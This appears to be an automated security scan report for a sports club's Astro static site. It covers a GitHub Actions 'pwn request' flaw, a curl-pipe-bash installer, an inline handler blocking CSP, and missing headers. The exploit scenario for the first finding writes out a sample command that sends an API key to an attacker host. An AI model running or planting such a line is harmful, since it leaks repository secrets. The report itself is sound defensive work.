# Security Vulnerability Report

**Project**: Sportvereniging H.G.V. Turnen Hengelo
**Scan date**: 2026-03-22
**Tech stack**: Astro.js v6.0.5 (static site, TypeScript, Cloudflare Pages)
**Scanner**: Claude Code automated security scan

---

## Summary

| # | Severity | Type | File | Line |
|---|----------|------|------|------|
| 1 | **Critical** | CI/CD Secret Exfiltration via `pull_request_target` | `.github/workflows/cursor-review.yml` | 8, 30–31 |
| 2 | **Medium** | Supply-chain risk: curl-pipe-to-bash installer | `.github/workflows/cursor-review.yml` | 34 |
| 3 | **Low** | Inline `onload` event handler (blocks strict CSP) | `src/pages/index.astro` | 24 |
| 4 | **Low** | Missing HTTP security headers (CSP, HSTS, X-Frame-Options) | `astro.config.mjs` / Cloudflare config | – |

---

## Vulnerabilities

### 1. Critical — "pwn request" via `pull_request_target` + secret checkout

**File**: `.github/workflows/cursor-review.yml`, lines 8–9 and 29–31

**Description**:
The workflow is triggered by both `pull_request` and `pull_request_target`. The `pull_request_target` event runs in the context of the *base* branch with access to repository secrets — even when the PR originates from a fork. The workflow then checks out the *fork's* code via:

```yaml
ref: ${{ github.event.pull_request.head.sha }}
```

This is the classic "pwn request" attack (CVE-style: GitHub Security Advisory). A malicious contributor can open a PR from a fork, modify workflow files or the code executed by the agent, and cause the runner to exfiltrate `CURSOR_API_KEY` and `GITHUB_TOKEN` to an attacker-controlled server.

**Exploit scenario**:
1. Attacker forks the repository.
2. Attacker adds `curl https://attacker.com/exfil?key=$CURSOR_API_KEY` to any file run during the review step.
3. Opens a PR — `pull_request_target` fires with full secret access, running the attacker's code.

**Current vulnerable lines**:
```yaml
# Line 8-9
on:
  pull_request_target:        # <-- runs with base-repo secrets for fork PRs
    branches: [main]

# Line 29-31
- uses: actions/checkout@v4
  with:
    fetch-depth: 0
    ref: ${{ github.event.pull_request.head.sha }}  # <-- checks out fork code
```

**Fix — Option A (preferred): Remove `pull_request_target`, use only `pull_request`**

If the workflow only needs to comment on internal PRs and Dependabot, `pull_request` is sufficient and does not expose secrets to fork code:

```yaml
on:
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, ready_for_review]
```

Remove the entire `pull_request_target` trigger block. The Dependabot-specific condition in the `if:` clause already handles the bot case via the `pull_request` event.

**Fix — Option B: Use environment protection if `pull_request_target` is required**

If forked-PR review is genuinely needed, never check out untrusted code in a `pull_request_target` job. Separate the secret-using logic from any code execution that comes from the fork:

```yaml
# Job 1: runs in pull_request_target context — NO code from fork
- name: Post review comment
  uses: actions/github-script@v7
  # Only uses pre-approved, pinned actions, no fork code

# Job 2: runs in pull_request (sandboxed) context — can check out fork code
# but has NO access to secrets
```

See: https://securitylab.github.com/research/github-actions-preventing-pwn-requests/

---

### 2. Medium — Supply-chain risk: curl-pipe-bash installer

**File**: `.github/workflows/cursor-review.yml`, line 34

**Description**:
The workflow installs the Cursor CLI by piping an HTTPS URL directly into bash:

```yaml
- name: Install Cursor CLI
  run: |
    curl https://cursor.com/install -fsS | bash
```

This pattern is dangerous because:
- It trusts the DNS/network path to `cursor.com` at runtime.
- If `cursor.com` is compromised or if a MITM attack occurs on the runner network, arbitrary code is executed with full runner permissions and secret access.
- It fetches an unpinned, mutable script — the script can change between runs.

**Fix**: Pin the installer to a specific version and verify its checksum, or replace with an official, versioned GitHub Action for Cursor if one exists:

```yaml
- name: Install Cursor CLI
  run: |
    # Download and verify checksum before executing
    curl -fsSL https://cursor.com/install/v1.2.3 -o install-cursor.sh
    echo "EXPECTED_SHA256  install-cursor.sh" | sha256sum --check
    bash install-cursor.sh
    echo "$HOME/.local/bin" >> $GITHUB_PATH
```

Alternatively, use a pinned Docker image that already includes the Cursor CLI.

---

### 3. Low — Inline `onload` handler blocks strict Content-Security-Policy

**File**: `src/pages/index.astro`, line 24

**Description**:
The hero image uses an inline `onload` event attribute:

```html
<img
  src="/images/hero.webp"
  onload="this.classList.add('loaded'); this.closest('.hero')?.classList.add('image-loaded')"
/>
```

The code itself is safe (no user input flows here), but inline event handlers require `'unsafe-inline'` in any `script-src` CSP directive, which substantially weakens the policy and allows other injected scripts to execute. This makes implementing a strict CSP impossible without removing this handler.

**Fix**: Move the logic to a script block using `addEventListener`:

```js
// In BaseLayout.astro <script> block (already present at line 67)
document.addEventListener('DOMContentLoaded', () => {
  const heroImg = document.querySelector('.hero-background img');
  if (heroImg) {
    heroImg.addEventListener('load', () => {
      heroImg.classList.add('loaded');
      heroImg.closest('.hero')?.classList.add('image-loaded');
    });
    // Handle already-loaded case (cached images)
    if (heroImg.complete) {
      heroImg.classList.add('loaded');
      heroImg.closest('.hero')?.classList.add('image-loaded');
    }
  }
});
```

Then remove the `onload` attribute from the `<img>` tag.

---

### 4. Low — Missing HTTP security headers

**File**: No `public/_headers` file exists; `astro.config.mjs` has no header configuration.

**Description**:
The site does not set the following recommended security headers:

| Header | Risk if missing |
|--------|----------------|
| `Content-Security-Policy` | XSS exploitation easier |
| `Strict-Transport-Security` | HTTPS downgrade attacks |
| `X-Frame-Options` | Clickjacking |
| `X-Content-Type-Options` | MIME sniffing attacks |
| `Referrer-Policy` | Leaks URL path in Referer header |
| `Permissions-Policy` | Unintended browser feature access |

**Fix**: Create `public/_headers` (Cloudflare Pages reads this file automatically):

```
/*
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; frame-ancestors 'none'
```

Note: `style-src 'unsafe-inline'` is needed for Astro's scoped styles. Once finding #3 (inline `onload`) is fixed, `script-src` can remain strict without `'unsafe-inline'`. The `is:inline` script in `BaseLayout.astro` will need a nonce or to be moved to a module script to allow a fully strict CSP.

---

## Positive security findings

- No backend, database, or user authentication — eliminates SQL injection, CSRF, session attacks.
- No user-controlled data rendered anywhere — no stored/reflected XSS vectors.
- No hardcoded secrets or `.env` files committed to the repository.
- Cloudflare tokens and API keys correctly stored as GitHub Actions secrets.
- Dependabot and Renovate are configured for dependency updates.
- TypeScript strict mode enabled.
- `.gitignore` correctly excludes `node_modules`, `dist`, `.env`.

---

## Recommended fix priority

1. **Immediately**: Fix `cursor-review.yml` — remove `pull_request_target` or separate the secret-using step from fork code execution.
2. **Short term**: Replace the curl-pipe-bash Cursor installer with a pinned, checksum-verified download.
3. **Short term**: Add `public/_headers` with security headers to Cloudflare Pages.
4. **Nice to have**: Move the `onload` attribute inline handler to a script block to enable a strict CSP.
